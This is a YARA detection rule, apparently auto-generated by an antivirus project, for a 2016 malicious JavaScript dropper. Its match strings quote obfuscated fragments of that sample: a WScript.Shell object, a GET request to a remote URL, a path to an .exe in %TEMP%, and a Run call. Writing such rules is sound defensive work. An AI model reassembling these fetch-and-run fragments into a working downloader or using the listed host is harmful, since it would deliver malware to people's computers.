rule sig_20160328_2fb07516195e9d04a6b3e9ac13b742c2 {
  meta:
    description = "datamaliciousorder - file 20160328_2fb07516195e9d04a6b3e9ac13b742c2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d3bcd8a208a225390d82ab59939ed4a8a3edcb9ae12ba205c2bc58db852bd308"

  strings:
    $s1  = "function Wqrkpdvha() {return Urhymks[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"5xkGDKtCd3NDrH.exe\";};" fullword ascii
    $s2  = "do {WScript[Ukvjurjvz](Bclbu() * 11)} while (Hkuwjp[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Urhymks = function Lkhuyeb() {return WScript[Gsgqryyfm](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Ewvjxawnzv(Rgmrlx, Rumzmqr){return Rgmrlx - Rumzmqr;};" fullword ascii
    $s5  = "Hkuwjp[Ljzqtevrrj](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s6  = "function Ormmqfknku() {return ((Ctnlqifg == true) && (Ctnlqifg == Nbawplwr)) ? 1 : Awvvclwtmn;};" fullword ascii
    $s7  = "function Euwmdmhj(Buobbapjhh){Urhymks[\"Run\"](Buobbapjhh, Awvvclwtmn, Awvvclwtmn);};" fullword ascii
    $s8  = "Ctnlqifg = true; " fullword ascii
    $s9  = " while (Htmabtx){" fullword ascii
    $s10 = "function Aafnzq(){return Gsgqryyfm;};" fullword ascii
    $s11 = "var Lufgkfvic = false;" fullword ascii
    $s12 = "return Ewvjxawnzv(Nccoae, Gokdscm);" fullword ascii
    $s13 = "function Bugfmdufi(Ltvczsi) {var Jfrhmwrxc = (1, 2, 3, 4, 5, Ltvczsi); return Jfrhmwrxc;};" fullword ascii
    $s14 = "function Btfwj()" fullword ascii
    $s15 = "function Hgmfap(){return Inygj;};" fullword ascii
    $s16 = "var Jegivuft = new this[\"Date\"]();" fullword ascii
    $s17 = "var Nbawplwr = false;" fullword ascii
    $s18 = "function Bclbu(){return 22;};" fullword ascii
    $s19 = "Nbawplwr = true; " fullword ascii
    $s20 = "var Ctnlqifg = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}